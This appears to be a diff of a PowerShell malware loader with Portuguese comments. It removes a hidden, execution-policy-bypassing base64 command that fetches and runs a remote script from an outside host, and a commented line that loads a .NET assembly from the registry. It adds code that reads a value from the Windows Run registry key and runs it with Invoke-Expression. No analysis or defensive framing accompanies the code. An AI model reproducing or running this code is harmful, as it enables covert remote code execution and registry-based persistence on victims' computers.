@@ -1,4 +1,8 @@
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABoAGUAYQBkAGUAcgBzACAAPQAgAEAAewAgACcAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAnACAAPQAgACcAeQBvAHUAcgBfAGYAaQB4AGUAZABfAHQAbwBrAGUAbgBfAGgAZQByAGUAJwAgAH0AOwAgAGkAZQB4ACAAKABpAHcAcgAgAC0AVQByAGkAIABoAHQAdABwAHMAOgAvAC8AZQBtAHAAdAB5AHMAZQByAHYAaQBjAGUAcwAuAHgAeQB6AC8AcwB0AHUAYgAuAHQAeAB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0ASABlAGEAZABlAHIAcwAgACQAaABlAGEAZABlAHIAcwApAA==
+# Caminho da chave no registro
+$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 
+# Lendo o valor armazenado na chave (assumindo que o comando está em 'N/A')
+$encodedCommand = (Get-ItemProperty -Path $registryPath -Name "N/A")."N/A"
 
-#powershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand (Get-ItemProperty -Path 'HKCU:\\Software\\N/A' -Name 'command').encodedCommand; Start-Sleep -Seconds 0; [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty -Path 'HKCU:\\Software\\N\A' -Name 'encrypt').encrypt)).EntryPoint.Invoke($null, @())
+# Executando o comando PowerShell diretamente
+Invoke-Expression $encodedCommand
